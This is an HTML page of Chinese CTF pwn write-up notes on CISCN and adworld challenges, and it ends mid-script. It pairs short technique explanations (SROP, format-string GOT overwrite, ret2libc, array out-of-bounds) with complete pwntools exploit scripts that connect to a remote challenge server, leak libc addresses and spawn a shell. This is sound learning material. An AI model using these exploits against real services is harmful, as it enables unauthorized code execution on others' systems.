@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="从0开始的pwner生活 本处为bbs上从0开始pwner生活的题目。
+CISCN_C_1 写这道题的时候认识到的很重要的一点是，使用ELF()来分析的是GOT表和PLT表等加载进入程序的地址，而非具体函数地址，故使用这个函数分析本地的可执行文件在未开启PIE保护的时候也可以确定远程加载进内存的GOT表和PLT表地址。
+使用在线工具查清楚libc版本后使用 glibc-all-in-one。
+❯ cd ./glibc-all-in-one ❯ ls LICENSE README.md build debs download download_old extract libs list old_list update_list ❯ cat list 2.23-0ubuntu11.3_amd64 2.23-0ubuntu11.3_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1.5_amd64 2.27-3ubuntu1.5_i386 2.27-3ubuntu1.6_amd64 2.27-3ubuntu1.6_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 2.31-0ubuntu9.16_amd64 2.31-0ubuntu9.16_i386 2.31-0ubuntu9_amd64 2.31-0ubuntu9_i386 2.35-0ubuntu3.8_amd64 2.35-0ubuntu3.8_i386 2.35-0ubuntu3_amd64 2.35-0ubuntu3_i386 2.37-0ubuntu2.2_amd64 2.37-0ubuntu2.2_i386 2.37-0ubuntu2_amd64 2.37-0ubuntu2_i386 2.38-1ubuntu6.3_amd64 2.38-1ubuntu6.3_i386 2.38-1ubuntu6_amd64 2.38-1ubuntu6_i386 2.39-0ubuntu8.3_amd64 2.39-0ubuntu8.3_i386 2.39-0ubuntu8_amd64 2.39-0ubuntu8_i386 2.40-1ubuntu3_amd64 2.40-1ubuntu3_i386 ❯ ./download 2.27-3ubuntu1_amd64 Getting 2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc binary package -&gt; Extracting libc binary package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc debug package -&gt; Extracting libc debug package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64/.debug ❯ cd .. ❯ cd ./glibc-all-in-one ❯ cd ./libs ❯ ls 2.27-3ubuntu1_amd64 2.40-1ubuntu3_amd64 ❯ cd ./2.27-3ubuntu1_amd64 ❯ ls ld-2.27.so libcidn-2.27.so libmvec-2.27.so libnss_files.so.2 libpthread.so.0 ld-linux-x86-64.so.2 libcidn.so.1 libmvec.so.1 libnss_hesiod-2.27.so libresolv-2.27.so libBrokenLocale-2.27.so libcrypt-2.27.so libnsl-2.27.so libnss_hesiod.so.2 libresolv.so.2 libBrokenLocale.so.1 libcrypt.so.1 libnsl.so.1 libnss_nis-2.27.so librt-2.27.so libSegFault.so libdl-2.27.so libnss_compat-2.27.so libnss_nis.so.2 librt.so.1 libanl-2.27.so libdl.so.2 libnss_compat.so.2 libnss_nisplus-2.27.so libthread_db-1.0.so libanl.so.1 libm-2.27.so libnss_dns-2.27.so libnss_nisplus.so.2 libthread_db.so.1 libc-2.27.so libm.so.6 libnss_dns.so.2 libpcprofile.so libutil-2.27.so libc.so.6 libmemusage.so libnss_files-2.27.so libpthread-2.27.so libutil.so.1 ❯ pwd /home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 使用patchelf修改链接库与链接器
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/notes/pwnstarter/" />
+
+
+    <title>
+        
+            Pwn简单题 :: My New Hugo Site 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.7289daf2e88ea2c7b253a51cc5794c7cc17e7aeb7295a19d978db764a5862f25.css" integrity="sha256-cona8uiOoseyU6UcxXlMfMF&#43;eutylaGdl423ZKWGLyU=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Pwn简单题">
+  <meta itemprop="description" content="从0开始的pwner生活 本处为bbs上从0开始pwner生活的题目。
+CISCN_C_1 写这道题的时候认识到的很重要的一点是，使用ELF()来分析的是GOT表和PLT表等加载进入程序的地址，而非具体函数地址，故使用这个函数分析本地的可执行文件在未开启PIE保护的时候也可以确定远程加载进内存的GOT表和PLT表地址。
+使用在线工具查清楚libc版本后使用 glibc-all-in-one。
+❯ cd ./glibc-all-in-one ❯ ls LICENSE README.md build debs download download_old extract libs list old_list update_list ❯ cat list 2.23-0ubuntu11.3_amd64 2.23-0ubuntu11.3_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1.5_amd64 2.27-3ubuntu1.5_i386 2.27-3ubuntu1.6_amd64 2.27-3ubuntu1.6_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 2.31-0ubuntu9.16_amd64 2.31-0ubuntu9.16_i386 2.31-0ubuntu9_amd64 2.31-0ubuntu9_i386 2.35-0ubuntu3.8_amd64 2.35-0ubuntu3.8_i386 2.35-0ubuntu3_amd64 2.35-0ubuntu3_i386 2.37-0ubuntu2.2_amd64 2.37-0ubuntu2.2_i386 2.37-0ubuntu2_amd64 2.37-0ubuntu2_i386 2.38-1ubuntu6.3_amd64 2.38-1ubuntu6.3_i386 2.38-1ubuntu6_amd64 2.38-1ubuntu6_i386 2.39-0ubuntu8.3_amd64 2.39-0ubuntu8.3_i386 2.39-0ubuntu8_amd64 2.39-0ubuntu8_i386 2.40-1ubuntu3_amd64 2.40-1ubuntu3_i386 ❯ ./download 2.27-3ubuntu1_amd64 Getting 2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc binary package -&gt; Extracting libc binary package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc debug package -&gt; Extracting libc debug package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64/.debug ❯ cd .. ❯ cd ./glibc-all-in-one ❯ cd ./libs ❯ ls 2.27-3ubuntu1_amd64 2.40-1ubuntu3_amd64 ❯ cd ./2.27-3ubuntu1_amd64 ❯ ls ld-2.27.so libcidn-2.27.so libmvec-2.27.so libnss_files.so.2 libpthread.so.0 ld-linux-x86-64.so.2 libcidn.so.1 libmvec.so.1 libnss_hesiod-2.27.so libresolv-2.27.so libBrokenLocale-2.27.so libcrypt-2.27.so libnsl-2.27.so libnss_hesiod.so.2 libresolv.so.2 libBrokenLocale.so.1 libcrypt.so.1 libnsl.so.1 libnss_nis-2.27.so librt-2.27.so libSegFault.so libdl-2.27.so libnss_compat-2.27.so libnss_nis.so.2 librt.so.1 libanl-2.27.so libdl.so.2 libnss_compat.so.2 libnss_nisplus-2.27.so libthread_db-1.0.so libanl.so.1 libm-2.27.so libnss_dns-2.27.so libnss_nisplus.so.2 libthread_db.so.1 libc-2.27.so libm.so.6 libnss_dns.so.2 libpcprofile.so libutil-2.27.so libc.so.6 libmemusage.so libnss_files-2.27.so libpthread-2.27.so libutil.so.1 ❯ pwd /home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 使用patchelf修改链接库与链接器">
+  <meta itemprop="datePublished" content="2026-03-16T17:17:14+08:00">
+  <meta itemprop="dateModified" content="2026-03-16T17:17:14+08:00">
+  <meta itemprop="wordCount" content="1137">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Pwn简单题">
+  <meta name="twitter:description" content="从0开始的pwner生活 本处为bbs上从0开始pwner生活的题目。
+CISCN_C_1 写这道题的时候认识到的很重要的一点是，使用ELF()来分析的是GOT表和PLT表等加载进入程序的地址，而非具体函数地址，故使用这个函数分析本地的可执行文件在未开启PIE保护的时候也可以确定远程加载进内存的GOT表和PLT表地址。
+使用在线工具查清楚libc版本后使用 glibc-all-in-one。
+❯ cd ./glibc-all-in-one ❯ ls LICENSE README.md build debs download download_old extract libs list old_list update_list ❯ cat list 2.23-0ubuntu11.3_amd64 2.23-0ubuntu11.3_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1.5_amd64 2.27-3ubuntu1.5_i386 2.27-3ubuntu1.6_amd64 2.27-3ubuntu1.6_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 2.31-0ubuntu9.16_amd64 2.31-0ubuntu9.16_i386 2.31-0ubuntu9_amd64 2.31-0ubuntu9_i386 2.35-0ubuntu3.8_amd64 2.35-0ubuntu3.8_i386 2.35-0ubuntu3_amd64 2.35-0ubuntu3_i386 2.37-0ubuntu2.2_amd64 2.37-0ubuntu2.2_i386 2.37-0ubuntu2_amd64 2.37-0ubuntu2_i386 2.38-1ubuntu6.3_amd64 2.38-1ubuntu6.3_i386 2.38-1ubuntu6_amd64 2.38-1ubuntu6_i386 2.39-0ubuntu8.3_amd64 2.39-0ubuntu8.3_i386 2.39-0ubuntu8_amd64 2.39-0ubuntu8_i386 2.40-1ubuntu3_amd64 2.40-1ubuntu3_i386 ❯ ./download 2.27-3ubuntu1_amd64 Getting 2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc binary package -&gt; Extracting libc binary package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64 -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.27-3ubuntu1_amd64.deb -&gt; Downloading libc debug package -&gt; Extracting libc debug package x - debian-binary x - control.tar.xz x - data.tar.xz /home/yooy/glibc-all-in-one -&gt; Package saved to libs/2.27-3ubuntu1_amd64/.debug ❯ cd .. ❯ cd ./glibc-all-in-one ❯ cd ./libs ❯ ls 2.27-3ubuntu1_amd64 2.40-1ubuntu3_amd64 ❯ cd ./2.27-3ubuntu1_amd64 ❯ ls ld-2.27.so libcidn-2.27.so libmvec-2.27.so libnss_files.so.2 libpthread.so.0 ld-linux-x86-64.so.2 libcidn.so.1 libmvec.so.1 libnss_hesiod-2.27.so libresolv-2.27.so libBrokenLocale-2.27.so libcrypt-2.27.so libnsl-2.27.so libnss_hesiod.so.2 libresolv.so.2 libBrokenLocale.so.1 libcrypt.so.1 libnsl.so.1 libnss_nis-2.27.so librt-2.27.so libSegFault.so libdl-2.27.so libnss_compat-2.27.so libnss_nis.so.2 librt.so.1 libanl-2.27.so libdl.so.2 libnss_compat.so.2 libnss_nisplus-2.27.so libthread_db-1.0.so libanl.so.1 libm-2.27.so libnss_dns-2.27.so libnss_nisplus.so.2 libthread_db.so.1 libc-2.27.so libm.so.6 libnss_dns.so.2 libpcprofile.so libutil-2.27.so libc.so.6 libmemusage.so libnss_files-2.27.so libpthread-2.27.so libutil.so.1 ❯ pwd /home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64 使用patchelf修改链接库与链接器">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-03-16 17:17:14 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner">
+                <li><a href="/notes">笔记</a></li>
+            
+    </ul>
+</nav>
+
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            
+    <div class="content">
+        <main class="post">
+
+            <div class="post-info">
+                
+                </p>
+            </div>
+
+            <article>
+                <h2 class="post-title"><a href="http://localhost:1313/notes/pwnstarter/">Pwn简单题</a></h2>
+
+                
+                
+                
+
+                <div class="post-content">
+                    <h1 id="从0开始的pwner生活">从0开始的pwner生活</h1>
+<p>本处为bbs上<code>从0开始pwner生活</code>的题目。</p>
+<h2 id="ciscn_c_1">CISCN_C_1</h2>
+<p>写这道题的时候认识到的很重要的一点是，使用ELF()来分析的是GOT表和PLT表等加载进入程序的地址，而非具体函数地址，故使用这个函数分析本地的可执行文件在未开启PIE保护的时候也可以确定远程加载进内存的GOT表和PLT表地址。</p>
+<p>使用在线工具查清楚libc版本后使用 glibc-all-in-one。</p>
+<pre tabindex="0"><code>❯ cd ./glibc-all-in-one
+❯ ls
+LICENSE  README.md  build  debs  download  download_old  extract  libs  list  old_list  update_list
+❯ cat list
+2.23-0ubuntu11.3_amd64
+2.23-0ubuntu11.3_i386
+2.23-0ubuntu3_amd64
+2.23-0ubuntu3_i386
+2.27-3ubuntu1.5_amd64
+2.27-3ubuntu1.5_i386
+2.27-3ubuntu1.6_amd64
+2.27-3ubuntu1.6_i386
+2.27-3ubuntu1_amd64
+2.27-3ubuntu1_i386
+2.31-0ubuntu9.16_amd64
+2.31-0ubuntu9.16_i386
+2.31-0ubuntu9_amd64
+2.31-0ubuntu9_i386
+2.35-0ubuntu3.8_amd64
+2.35-0ubuntu3.8_i386
+2.35-0ubuntu3_amd64
+2.35-0ubuntu3_i386
+2.37-0ubuntu2.2_amd64
+2.37-0ubuntu2.2_i386
+2.37-0ubuntu2_amd64
+2.37-0ubuntu2_i386
+2.38-1ubuntu6.3_amd64
+2.38-1ubuntu6.3_i386
+2.38-1ubuntu6_amd64
+2.38-1ubuntu6_i386
+2.39-0ubuntu8.3_amd64
+2.39-0ubuntu8.3_i386
+2.39-0ubuntu8_amd64
+2.39-0ubuntu8_i386
+2.40-1ubuntu3_amd64
+2.40-1ubuntu3_i386
+❯ ./download 2.27-3ubuntu1_amd64
+Getting 2.27-3ubuntu1_amd64
+  -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb
+  -&gt; Downloading libc binary package
+  -&gt; Extracting libc binary package
+x - debian-binary
+x - control.tar.xz
+x - data.tar.xz
+/home/yooy/glibc-all-in-one
+  -&gt; Package saved to libs/2.27-3ubuntu1_amd64
+  -&gt; Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.27-3ubuntu1_amd64.deb
+  -&gt; Downloading libc debug package
+  -&gt; Extracting libc debug package
+x - debian-binary
+x - control.tar.xz
+x - data.tar.xz
+/home/yooy/glibc-all-in-one
+  -&gt; Package saved to libs/2.27-3ubuntu1_amd64/.debug
+❯ cd ..
+❯ cd ./glibc-all-in-one
+❯ cd ./libs
+❯ ls
+2.27-3ubuntu1_amd64  2.40-1ubuntu3_amd64
+❯ cd ./2.27-3ubuntu1_amd64
+❯ ls
+ld-2.27.so               libcidn-2.27.so   libmvec-2.27.so        libnss_files.so.2       libpthread.so.0
+ld-linux-x86-64.so.2     libcidn.so.1      libmvec.so.1           libnss_hesiod-2.27.so   libresolv-2.27.so
+libBrokenLocale-2.27.so  libcrypt-2.27.so  libnsl-2.27.so         libnss_hesiod.so.2      libresolv.so.2
+libBrokenLocale.so.1     libcrypt.so.1     libnsl.so.1            libnss_nis-2.27.so      librt-2.27.so
+libSegFault.so           libdl-2.27.so     libnss_compat-2.27.so  libnss_nis.so.2         librt.so.1
+libanl-2.27.so           libdl.so.2        libnss_compat.so.2     libnss_nisplus-2.27.so  libthread_db-1.0.so
+libanl.so.1              libm-2.27.so      libnss_dns-2.27.so     libnss_nisplus.so.2     libthread_db.so.1
+libc-2.27.so             libm.so.6         libnss_dns.so.2        libpcprofile.so         libutil-2.27.so
+libc.so.6                libmemusage.so    libnss_files-2.27.so   libpthread-2.27.so      libutil.so.1
+❯ pwd
+/home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64
+</code></pre><p>使用<code>patchelf</code>修改链接库与链接器</p>
+<pre tabindex="0"><code> patchelf --set-interpreter /home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 ./ciscn_c_1
+ patchelf --replace-needed libc.so.6  /home/yooy/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6 ./ciscn_c_1
+</code></pre><p>随后本地就和远程环境一样了，也不需要使用卡得要死的libcsearcher了！！！！</p>
+<h2 id="ciscn_s_3">CISCN_S_3</h2>
+<p>一道使用ret2csu或者srop即可解决的题目。</p>
+<h3 id="要点1">要点1</h3>
+<p>在本道题目中学到的第一点是形如这种函数中有栈溢出漏洞时：</p>
+<p><img src="C:%5CUsers%5C32448%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241117180716393.png" alt="image-20241117180716393"></p>
+<p>应当发现其没有<code>leave</code>指令。这也导致了ida对sp寄存器的分析失败。本题中算返回地址偏移时不应加上8！</p>
+<h3 id="要点2">要点2</h3>
+<p>SROP利用基本原理：</p>
+<p><a href="https://www.anquanke.com/post/id/85810">【技术分享】Sigreturn Oriented Programming攻击简介-安全客 - 安全资讯平台 (anquanke.com)</a></p>
+<p>讲的很清楚，其实Sigreturn就是正常信号处理中用于恢复上下文（即寄存器信息）的一个系统调用。当处理其他系统调用前，程序会将上下文存储在栈上。特定系统调用结束后，程序调用Sigreturn来进行上下文的恢复。使用pwntools中的<code>SigretutnFrame</code>工具时记得指定架构！</p>
+<pre tabindex="0"><code>context.arch = &#39;amd64&#39;
+frame = SigreturnFrame()
+frame.rip = syscall
+frame.rdi = buf_addr
+frame.rsi = 0
+frame.rdx = 0
+frame.rax = 0x3b
+</code></pre><h2 id="r2t4">r2t4</h2>
+<p>格式化字符串漏洞，这里说几个要点。</p>
+<h3 id="要点1-1">要点1</h3>
+<p>本题目的利用方式是修改<code>'__stack_chk_fail'</code>GOT表中的地址（没开PIE），使得触发栈溢出保护的时候跳转到后门函数。</p>
+<h3 id="要点2-1">要点2</h3>
+<p>格式化字符串中都<code>%k$n</code>为在第k个参数的位置上的存的地址内写入四个字节。hn为两个，hhn为一个，写入的内容为已经输出的字节数。</p>
+<p>如果是</p>
+<pre tabindex="0"><code>printf(buf)
+</code></pre><p>的话，buf本身为第一个参数，从buf的第二个字长的起始为第7个参数（）前六个在寄存器中。</p>
+<p>值得注意的是，机器字长为划分参数的单位。故应当确保格式化字符串字长对齐（尤其是地址任意写，下面便是例子）。</p>
+<h3 id="要点3">要点3</h3>
+<pre tabindex="0"><code>payload = p64(stack_check_got + 2) + p64(stack_check_got + 2) + p64(stack_check_got) + b&#39;%40c%7$hn%1510c%8$hnaass&#39; + b&#39;fuck&#39; * 10
+
+payload = b&#39;%64c%9$hn%1510c%10$hn\x00\x00\x00&#39;  + p64(stack_check_got + 2) + p64(stack_check_got) + b&#39;fuck&#39; * 10
+</code></pre><p>这两种payload虽然效果看起来一样，但是第一种中地址带有<code>\x00</code>， printf显然会在该处被截断，也就无法实现后面的修改。下面这个虽然前面也带了<code>\x00</code>，但后面的地址写在栈上即可，不需要其被打印或者解析，故无妨。</p>
+<h3 id="要点4">要点4</h3>
+<p>其实也不算是个要点，更多是一个最好记住的小 tips:在64位下，函数的前五个参数在参数寄存器中，第六个参数从栈上格式化字符串本身开始算</p>
+<h1 id="攻防世界">攻防世界</h1>
+<p>此处仅收录让我查wp或印象深刻的题目</p>
+<h2 id="int_overflow">int_overflow</h2>
+<p>本题目重点要明白的就是关键变量的大小，比如题目中给出的是<code>_int8</code>是个8位的整形变量，因此不需要特别大的数字就可以实现溢出。</p>
+<p>exp:</p>
+<pre tabindex="0"><code>from pwn import
+context.log_level = &#39;debug&#39;
+context.terminal = [&#39;wt.exe&#39;, &#39;wsl&#39;]
+context.arch = &#39;i386&#39;
+context.os = &#39;linux&#39;
+#io = process(&#39;./pwn6&#39;)
+#gdb.attach(io)
+#pause()
+io = remote(&#39;61.147.171.105&#39;,50523)
+#elf = ELF(&#39;./ciscn_s_3&#39;)
+#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+pwnme = 0x0804868B
+io.sendline(str(1))
+io.sendline(str(1))
+io.recvuntil(&#34;passwd:&#34;)
+io.sendline(0x18 * b&#39;s&#39; + p32(pwnme) + 234 * b&#39;s&#39;)
+io.interactive()
+</code></pre><h2 id="level3">level3</h2>
+<pre tabindex="0"><code>from pwn import *
+#context.log_level = &#39;debug&#39;
+context.terminal = [&#39;wt.exe&#39;, &#39;wsl&#39;]
+context.arch = &#39;i386&#39;
+context.os = &#39;linux&#39;
+bin_sh = &#34;/bin/sh&#34;
+name = &#34;clark&#34;
+#io = process(&#39;./level3&#39;)
+#gdb.attach(io,&#39;b write&#39;)
+#pause()
+io = remote(&#39;61.147.171.105&#39;,53533)
+elf = ELF(&#39;./level3&#39;)
+libc = ELF(&#39;./libc_32.so.6&#39;)
+
+pad = 0x8C * b&#39;a&#39;
+write_plt = elf.plt[&#39;write&#39;]
+write_got = elf.got[&#39;write&#39;]
+main = elf.sym[&#39;main&#39;]
+io.recvuntil(&#34;\n&#34;)
+#payload = flat(pad, 0x080484A6, 1, write_got, 0x4, main)
+payload = flat(pad, write_plt, main, 1, write_got, 0x4, main)
+
+io.sendline(payload)
+leak = u32(io.recv(4))
+log.success(hex(leak))
+
+system = libc.sym[&#39;system&#39;] - libc.sym[&#39;write&#39;] + leak
+binsh = next(libc.search(b&#34;/bin/sh&#34;)) - libc.sym[&#39;write&#39;] + leak
+log.success(hex(system))
+log.success(hex(binsh))
+
+io.recvuntil(&#34;\n&#34;)
+payload = flat(pad, system, main, binsh)
+io.sendline(payload)
+
+io.interactive()
+</code></pre><p>主要涉及32位参数与返回地址在栈上的分布问题:
+32位之下，以函数<code>func(v1, v2, v3)</code>为例，参数与返回地址如下进行布置</p>
+<pre tabindex="0"><code>esp-&gt;	data
+		aaaa
+		aaaa
+ebp-&gt;	prev_ebp
+		ret_address
+		v1
+		v2
+		v3
+</code></pre><h2 id="dice_game">dice_game</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#39;./dice_game&#39;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;61.147.171.105&#39;</span>,<span style="color:#ae81ff">55041</span>) 
+</span></span><span style="display:flex;"><span>pad1 <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x50</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> 
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(pad1, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>	res<span style="color:#f92672">.</span>append(libc<span style="color:#f92672">.</span>rand()<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> point <span style="color:#f92672">in</span> res:
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;point(1~6): &#34;</span>, str(point))
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>本题主要是了解了<code>ctypes</code>库的使用方法。</p>
+<h2 id="stack2">stack2</h2>
+<pre tabindex="0"><code>from pwn import *
+#context.log_level = &#39;debug&#39;
+context.terminal = [&#39;wt.exe&#39;, &#39;wsl&#39;]
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+bin_sh = &#34;/bin/sh&#34;
+name = &#34;clark&#34;
+#io = process(&#39;./pwn13&#39;)
+#gdb.attach(io,&#39;b printf&#39;)
+#pause()
+io = remote(&#39;61.147.171.105&#39;,62695)
+elf = ELF(&#39;./pwn12&#39;)
+#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+checkfail = elf.got[&#39;__stack_chk_fail&#39;]
+pad = b&#39;a&#39; * 0x70
+write ofst = 0x84
+system = [0x50,0x84,0x04,0x08]
+#gadget = [0x5a, 0x89, 0x04, 0x08]
+bin_sh = [0x87, 0x89, 0x04, 0x08]
+
+saf = lambda x, y: io.sendlineafter(x, y)
+def change(location: int, num: int):
+	saf(&#34;5. exit&#34;, str(3))
+	saf(&#34;which number to change:&#34;, str(location))
+	saf(&#34;new number:&#34;, str(num))
+	
+saf(&#34;How many numbers you have:&#34;, str(1))
+saf(&#34;Give me your numbers&#34;, str(1))
+for i in range(4):
+	change(write_ofst + i, system[i])
+for i in range(4):
+	change(write_ofst + 8 + i, bin_sh[i])
+
+saf(&#34;5. exit&#34;, str(5))
+io.interactive()
+</code></pre><p>本题原理很简单，数组越界不检查漏洞。主要看看怎么写exp比较简便</p>
+<h2 id="pwn-100">pwn-100</h2>
+<p><code>LibcSearcher</code>，没啥好说的。</p>
+<pre tabindex="0"><code>from pwn import *
+from LibcSearcher import*
+#context.log_level = &#39;debug&#39;
+context.terminal = [&#39;wt.exe&#39;, &#39;wsl&#39;]
+context.arch = &#39;amd64&#39;
+context.os = &#39;linux&#39;
+#io = process(&#39;./pwn14&#39;)
+#gdb.attach(io,&#39;b puts&#39;)
+#pause()
+io = remote(&#39;61.147.171.105&#39;, 60112)
+elf = ELF(&#39;./pwn14&#39;)
+
+pop_rdi_ret = 0x0000000000400763
+puts_plt = elf.plt[&#39;puts&#39;]
+read_got = elf.got[&#39;read&#39;]
+main = 0x000000000040068E
+pad = 0x48 * b&#39;a&#39;
+saf = lambda x, y: io.sendlineafter(x, y)
+payload = flat(pad, pop_rdi_ret, read_got, puts_plt, main)
+io.sendline(payload.ljust(200, b&#39;\x00&#39;))
+io.recvuntil(&#34;bye~\n&#34;)
+
+leak = u64(io.recvuntil(&#34;\x7f&#34;).ljust(8,b&#39;\x00&#39;))
+log.success(hex(leak))
+
+libc = LibcSearcher(&#34;read&#34;, leak)
+libcbase = leak - libc.dump(&#34;read&#34;)
+system = libcbase + libc.dump(&#34;system&#34;)
+binsh = libcbase + libc.dump(&#34;str_bin_sh&#34;)
+log.success(hex(system))
+ret_addr = 0x00000000004004e1
+
+
+payload = 0x47 * b&#39;a&#39; + p64(pop_rdi_ret) + p64(binsh) + p64(ret_addr) + p64(system)
+io.sendline(payload.ljust(200, b&#39;\x00&#39;))
+io.recvuntil(&#34;bye~\n&#34;)
+io.interactive()
+</code></pre><h2 id="monkey">monkey</h2>
+<p>一道蛮奇妙的题，告诉我们不要深陷套路</p>
+<p>[<a href="https://blog.csdn.net/Y_peak/article/details/114164401#:~:text=%E9%A2%9D%EF%BC%8C%E6%80%8E%E4%B9%88%E8%AF%B4%E5%91%A2%E8%BF%99%E9%81%93%E9%A2%98%E3%80%82checksec%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A4%A7%E4%B8%8D%E4%BA%86%E7%9A%84">攻防世界 pwn]——monkey_攻防世界 monkey-CSDN博客</a></p>
+<pre tabindex="0"><code>from pwn import *
+from LibcSearcher import*
